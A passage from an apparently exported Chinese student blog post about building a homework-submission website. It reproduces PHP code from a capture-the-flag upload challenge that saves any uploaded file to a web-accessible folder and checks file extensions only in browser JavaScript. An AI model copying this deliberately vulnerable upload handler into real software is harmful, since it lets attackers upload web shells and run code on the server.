if(file==\"\"||file==null)\n    {\n        alert(\"请添加上传文件\");\n        return false;\n    }\n    else\n    {\n        var whitelist=new Array(\".jpg\",\".png\",\".gif\");\n        var file_suffix=file.substring(file.lastIndexOf(\".\"));\n        if(whitelist.indexOf(file_suffix) == -1)\n        {\n            alert(\":(该文件不允许上传:(\");\n            return false;\n        }\n    }\n}\n</script>\n</body>\n</html>\n```\n\n这题考的是 JS 前端验证的绕过，解出题后的我深知前端验证的不可靠，便知道敏感的操作限制应该加在后端了。但毕竟前端也得有点拦一下不是，否则累死后端不说，代码冗杂也是一个问题。上百度抄一抄，后端的后缀限制也完成了（解释一下，之所以限制文件后缀，一方面是因为提交的文件格式问题，一方面是安全问题，假若给你上传了一个 php 木马而我又没加限制访问的情况下， RCE 就是件很简单的事情了，之后你可以查看和操作任意权限允许的文件，总之是很危险的事）。\n在完成后缀的限制后，我又加了如下的诸多验证：\n\n**文件大小非空且大小须小于512KB(后来改成了666KB)** ：否则给你当网盘使那我服务器也是难顶，而且源文件最大也没什么可能超过 10 KB，截图预计也是几十 KB\n**upload目录的访问限制**：可不能给随便偷了作业看\n**姓名不能为空且不多于4个字**：这个问过课代表，我们班的名字没有超过 3 个字的\n**学号范围**：086-199 ，但有一个人的学号孤悬在外，有些奇怪（乐）\n**姓名和学号的联合验证**：这个是前两天才加上去的，主要是忘了之前的军事课有份名单（但是那位竟然是没有的，再处理吧）\n\n## 后端处理逻辑重构\n\n一开始我是设置先新建（姓名+学号）的一个目录，再逐个文件进行判断，若符合条件则放进目录里，但这就会引发一个问题，如果有文件不符合条件的话目录仍会存在，而为了防止有意或是无意的重复上传导致原文件被覆盖，我又设置了若目录已存在则不能继续放文件,于是我在上机课的时候改成了先全部验证通过再上传目录。\n\n## 管理员端\n\n毕竟作业也不是我收的，如果每次都要我来登录服务器下载未免也太过麻烦，于是我抄了段多级目录压缩的代码，在管理员通过验证后将提交上的作业打包成了个 zip ，再存储于基于 SHA256 算法生成的时间哈希值命名的目录中，这样大概便无法被直接扫描出来了。\n管理员的登录验证我采用的是RSA公钥加密出的一段 base64 编码的字符串，若在后端用私钥解密后得到明文\"admin\"便通过验证，但想了想似乎没必要用非对称加密，有空再改。\n除此之外，我还加了个验证码，但是在 Firefox 上似乎不能正常刷新，于是就没加在学生端了。\n\n## 前端的样式\n\n这个是我最无奈的地方，个人的美术功底着实是捞得亚匹，布局和配色搞得乱七八糟，在此就希望同学多多与我反馈了。\n\n## 一些问题\n\n### 开源\n\n本来打算上传到 github 的，但是还没处理好重要文件的放置（总不能学号和姓名也开源不是）。\n\n>_更新：项目已发布于_\n_<https://github.com/weyung/A-simple-homework-submission-platform>_\n\n### JQuery\n\n说来有些可笑，我一开始是用原生 Javescript 写的前端，代码繁琐且在使用 ajax 的时候被异步坑了一把：我写了一个函数调用后端的接口然后 return 数据，却发现主函数中得到的结果总是 undefined ，后来才知道是先 return 再接收数据，晕。而用 JQuery 一个回调函数就搞定了，虽然 JQuery 似乎的确有些过时，但有空再看 React、Vue 什么的吧。\n\n### SSH\n\n之前是想用 VSCode 写代码的，但是 SSH 一直显示什么管道不存在，直到今晚才瞎搞接通了。用宝塔的在线文本编辑器写了一个星期的代码，现在终于能有舒服点的高亮了。至于调试也是个问题，因为懒得搭本地环境，我至今还是肉眼调试，有空也得处理下。\n","slug":"一个简单的作业提交平台","published":1,"updated":"2022-11-08T09:31:55.928Z","_id":"cl8wgppp8000yck6g31l8aru0","comments":1,"layout":"post","photos":[],"content":"<p>这个项目大概是上星期五晚开始做的，之所以现在才写这篇文，纯粹是因为没有时间，刚好今早把高数写完了， CAD 又不想动，于是便借此时间简单总结一下。</p>\n<span id=\"more\"></span>\n<p>首先写这个网站的起因是邮箱发作业实在是过于麻烦，看着隔壁广州计算机的都用着 Matrix（一个我们大学学生运维的 OJ ，即在线判题平台），一点提交就有结果，而我们交作业却是原始的上交源文件和运行截图，我也无何办法，谁让我们是材料计算机呢（并无歧视材料的意思，只是单纯地憎恶化学，高中本就没选）。等我和课代表商量的时候，他也表示早已被不按规则提交的作业搞得苦不堪言（乐），想了想，虽然费劲写个小破站有些浪费时间，与大卷之势相悖，但毕竟也算有点意思，便做了下去。</p>\n<hr>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>最初的文件是直接抄中国人民公安大学的一道信安题的，代码附上：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//设置上传目录</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;UPLOAD_PATH&quot;</span>, <span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>) . <span class=\"string\">&quot;/upload/&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">// define(&quot;UPLOAD_URL_PATH&quot;, str_replace($_SERVER[&#x27;DOCUMENT_ROOT&#x27;], &quot;&quot;, UPLOAD_PATH));</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mkdir</span>(UPLOAD_PATH, <span class=\"number\">0755</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;size&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;请添加上传文件&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class=\"variable\">$name</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . <span class=\"string\">&quot;/upload/&quot;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$myfile</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;log.txt&quot;</span>, <span class=\"string\">&quot;a&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Unable to open file!&quot;</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>,<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class=\"line\">            <span class=\"variable\">$txt</span>=<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>,<span class=\"variable\">$txt</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$myfile</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;PPSUC 文件上传 - js前端验证&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;h1&gt;PPSUC 文件上传 - js前端验证&lt;/h1&gt;</span><br><span class=\"line\">    &lt;p&gt;本题从PPSUC窃取得来&lt;/p&gt;</span><br><span class=\"line\">    &lt;form action=<span class=\"string\">&quot;&quot;</span> method=<span class=\"string\">&quot;post&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span> onsubmit=<span class=\"string\">&quot;return checkfilesuffix()&quot;</span>&gt;</span><br><span class=\"line\">        &lt;label <span class=\"keyword\">for</span>=<span class=\"string\">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class=\"line\">        &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> id=<span class=\"string\">&quot;file&quot;</span> /&gt;</span><br><span class=\"line\">        &lt;br /&gt;</span><br><span class=\"line\">        &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;Submit&quot;</span> /&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkfilesuffix</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> file=document.<span class=\"title function_ invoke__\">getElementsByName</span>(<span class=\"string\">&#x27;file&#x27;</span>)[<span class=\"number\">0</span>][<span class=\"string\">&#x27;value&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file==<span class=\"string\">&quot;&quot;</span>||file==<span class=\"literal\">null</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alert</span>(<span class=\"string\">&quot;请添加上传文件&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> whitelist=<span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>(<span class=\"string\">&quot;.jpg&quot;</span>,<span class=\"string\">&quot;.png&quot;</span>,<span class=\"string\">&quot;.gif&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> file_suffix=file.<span class=\"title function_ invoke__\">substring</span>(file.<span class=\"title function_ invoke__\">lastIndexOf</span>(<span class=\"string\">&quot;.&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(whitelist.<span class=\"title function_ invoke__\">indexOf</span>(file_suffix) == -<span class=\"number\">1</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">alert</span>(<span class=\"string\">&quot;:(该文件不允许上传:(&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这题考的是 JS 前端验证的绕过，解出题后的我深知前端验证的不可靠，便知道敏感的操作限制应该加在后端了。但毕竟前端也得有点拦一下不是，否则累死后端不说，代码冗杂也是一个问题。上百度抄一抄，后端的后缀限制也完成了（解释一下，之所以限制文件后缀，一方面是因为提交的文件格式问题，一方面是安全问题，假若给你上传了一个 php 木马而我又没加限制访问的情况下， RCE 就是件很简单的事情了，之后你可以查看和操作任意权限允许的文件，总之是很危险的事）。<br>在完成后缀的限制后，我又加了如下的诸多验证：</p>\n<p><strong>文件大小非空且大小须小于512KB(后来改成了666KB)</strong> ：否则给你当网盘使那我服务器也是难顶，而且源文件最大也没什么可能超过 10 KB，截图预计也是几十 KB<br><strong>upload目录的访问限制</strong>：可不能给随便偷了作业看<br><strong>姓名不能为空且不多于4个字</strong>：这个问过课代表，我们班的名字没有超过 3 个字的<br><strong>学号范围</strong>：086-199 ，但有一个人的学号孤悬在外，有些奇怪（乐）<br><strong>姓名和学号的联合验证</strong>：这个是前两天才加上去的，主要是忘了之前的军事课有份名单（但是那位竟然是没有的，再处理吧）</p>\n<h2 id=\"后端处理逻辑重构\"><a href=\"#后端处理逻辑重构\" class=\"headerlink\" title=\"后端处理逻辑重构\"></a>后端处理逻辑重构</h2><p>一开始我是设置先新建（姓名+学号）的一个目录，再逐个文件进行判断，若符合条件则放进目录里，但这就会引发一个问题，如果有文件不符合条件的话目录仍会存在，而为了防止有意或是无意的重复上传导致原文件被覆盖，我又设置了若目录已存在则不能继续放文件,于是我在上机课的时候改成了先全部验证通过再上传目录。</p>\n<h2 id=\"管理员端\"><a href=\"#管理员端\" class=\"headerlink\" title=\"管理员端\"></a>管理员端</h2><p>毕竟作业也不是我收的，如果每次都要我来登录服务器下载未免也太过麻烦，于是我抄了段多级目录压缩的代码，在管理员通过验证后将提交上的作业打包成了个 zip ，再存储于基于 SHA256 算法生成的时间哈希值命名的目录中，这样大概便无法被直接扫描出来了。<br>管理员的登录验证我采用的是RSA公钥加密出的一段 base64 编码的字符串，若在后端用私钥解密后得到明文”admin”便通过验证，但想了想似乎没必要用非对称加密，有空再改。<br>除此之外，我还加了个验证码，但是在 Firefox 上似乎不能正常刷新，于是就没加在学生端了。</p>\n<h2 id=\"前端的样式\"><a href=\"#前端的样式\" class=\"headerlink\" title=\"前端的样式\"></a>前端的样式</h2><p>这个是我最无奈的地方，个人的美术功底着实是捞得亚匹，布局和配色搞得乱七八糟，在此就希望同学多多与我反馈了。</p>\n<h2 id=\"一些问题\"><a href=\"#一些问题\" class=\"headerlink\" title=\"一些问题\"></a>一些问题</h2><h3 id=\"开源\"><a href=\"#开源\" class=\"headerlink\" title=\"开源\"></a>开源</h3><p>本来打算上传到 github 的，但是还没处理好重要文件的放置（总不能学号和姓名也开源不是）。</p>\n<blockquote>\n<p><em>更新：项目已发布于</em><br><em><a href=\"https://github.com/weyung/A-simple-homework-submission-platform\">https://github.com/weyung/A-simple-homework-submission-platform</a></em></p>\n</blockquote>\n<h3 id=\"JQuery\"><a href=\"#JQuery\" class=\"headerlink\" title=\"JQuery\"></a>JQuery</h3><p>说来有些可笑，我一开始是用原生 Javescript 写的前端，代码繁琐且在使用 ajax 的时候被异步坑了一把：我写了一个函数调用后端的接口然后 return 数据，却发现主函数中得到的结果总是 undefined ，后来才知道是先 return 再接收数据，晕。而用 JQuery 一个回调函数就搞定了，虽然 JQuery 似乎的确有些过时，但有空再看 React、Vue 什么的吧。</p>\n<h3 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h3><p>之前是想用 VSCode 写代码的，但是 SSH 一直显示什么管道不存在，直到今晚才瞎搞接通了。用宝塔的在线文本编辑器写了一个星期的代码，现在终于能有舒服点的高亮了。至于调试也是个问题，因为懒得搭本地环境，我至今还是肉眼调试，有空也得处理下。</p>\n","excerpt":"<p>这个项目大概是上星期五晚开始做的，之所以现在才写这篇文，纯粹是因为没有时间，刚好今早把高数写完了， CAD 又不想动，于是便借此时间简单总结一下。</p>","more":"<p>首先写这个网站的起因是邮箱发作业实在是过于麻烦，看着隔壁广州计算机的都用着 Matrix（一个我们大学学生运维的 OJ ，即在线判题平台），一点提交就有结果，而我们交作业却是原始的上交源文件和运行截图，我也无何办法，谁让我们是材料计算机呢（并无歧视材料的意思，只是单纯地憎恶化学，高中本就没选）。等我和课代表商量的时候，他也表示早已被不按规则提交的作业搞得苦不堪言（乐），想了想，虽然费劲写个小破站有些浪费时间，与大卷之势相悖，但毕竟也算有点意思，便做了下去。</p>\n<hr>\n<h2 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h2><p>最初的文件是直接抄中国人民公安大学的一道信安题的，代码附上：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">//设置上传目录</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">define</span>(<span class=\"string\">&quot;UPLOAD_PATH&quot;</span>, <span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>) . <span class=\"string\">&quot;/upload/&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">// define(&quot;UPLOAD_URL_PATH&quot;, str_replace($_SERVER[&#x27;DOCUMENT_ROOT&#x27;], &quot;&quot;, UPLOAD_PATH));</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mkdir</span>(UPLOAD_PATH, <span class=\"number\">0755</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;size&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;请添加上传文件&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">basename</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], UPLOAD_PATH . <span class=\"variable\">$name</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . <span class=\"string\">&quot;/upload/&quot;</span> . <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$myfile</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"string\">&quot;log.txt&quot;</span>, <span class=\"string\">&quot;a&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Unable to open file!&quot;</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>,<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class=\"line\">            <span class=\"variable\">$txt</span>=<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">fwrite</span>(<span class=\"variable\">$myfile</span>,<span class=\"variable\">$txt</span>);</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$myfile</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;PPSUC 文件上传 - js前端验证&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;h1&gt;PPSUC 文件上传 - js前端验证&lt;/h1&gt;</span><br><span class=\"line\">    &lt;p&gt;本题从PPSUC窃取得来&lt;/p&gt;</span><br><span class=\"line\">    &lt;form action=<span class=\"string\">&quot;&quot;</span> method=<span class=\"string\">&quot;post&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span> onsubmit=<span class=\"string\">&quot;return checkfilesuffix()&quot;</span>&gt;</span><br><span class=\"line\">        &lt;label <span class=\"keyword\">for</span>=<span class=\"string\">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class=\"line\">        &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> id=<span class=\"string\">&quot;file&quot;</span> /&gt;</span><br><span class=\"line\">        &lt;br /&gt;</span><br><span class=\"line\">        &lt;input type=<span class=\"string\">&quot;submit&quot;</span> name=<span class=\"string\">&quot;submit&quot;</span> value=<span class=\"string\">&quot;Submit&quot;</span> /&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkfilesuffix</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> file=document.<span class=\"title function_ invoke__\">getElementsByName</span>(<span class=\"string\">&#x27;file&#x27;</span>)[<span class=\"number\">0</span>][<span class=\"string\">&#x27;value&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(file==<span class=\"string\">&quot;&quot;</span>||file==<span class=\"literal\">null</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">alert</span>(<span class=\"string\">&quot;请添加上传文件&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> whitelist=<span class=\"keyword\">new</span> <span class=\"title class_\">Array</span>(<span class=\"string\">&quot;.jpg&quot;</span>,<span class=\"string\">&quot;.png&quot;</span>,<span class=\"string\">&quot;.gif&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> file_suffix=file.<span class=\"title function_ invoke__\">substring</span>(file.<span class=\"title function_ invoke__\">lastIndexOf</span>(<span class=\"string\">&quot;.&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(whitelist.<span class=\"title function_ invoke__\">indexOf</span>(file_suffix) == -<span class=\"number\">1</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">alert</span>(<span class=\"string\">&quot;:(该文件不允许上传:(&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>这题考的是 JS 前端验证的绕过，解出题后的我深知前端验证的不可靠，便知道敏感的操作限制应该加在后端了。但毕竟前端也得有点拦一下不是，否则累死后端不说，代码冗杂也是一个问题。上百度抄一抄，后端的后缀限制也完成了（解释一下，之所以限制文件后缀，一方面是因为提交的文件格式问题，一方面是安全问题，假若给你上传了一个 php 木马而我又没加限制访问的情况下， RCE 就是件很简单的事情了，之后你可以查看和操作任意权限允许的文件，总之是很危险的事）。<br>在完成后缀的限制后，我又加了如下的诸多验证：</p>\n<p><strong>文件大小非空且大小须小于512KB(后来改成了666KB)</strong> ：否则给你当网盘使那我服务器也是难顶，而且源文件最大也没什么可能超过 10 KB，截图预计也是几十 KB<br><strong>upload目录的访问限制</strong>：可不能给随便偷了作业看<br><strong>姓名不能为空且不多于4个字</strong>：这个问过课代表，我们班的名字没有超过 3 个字的<br><strong>学号范围</strong>：086-199 ，但有一个人的学号孤悬在外，有些奇怪（乐）<br><strong>姓名和学号的联合验证</strong>：这个是前两天才加上去的，主要是忘了之前的军事课有份名单（但是那位竟然是没有的，再处理吧）</p>\n<h2 id=\"后端处理逻辑重构\"><a href=\"#后端处理逻辑重构\" class=\"headerlink\" 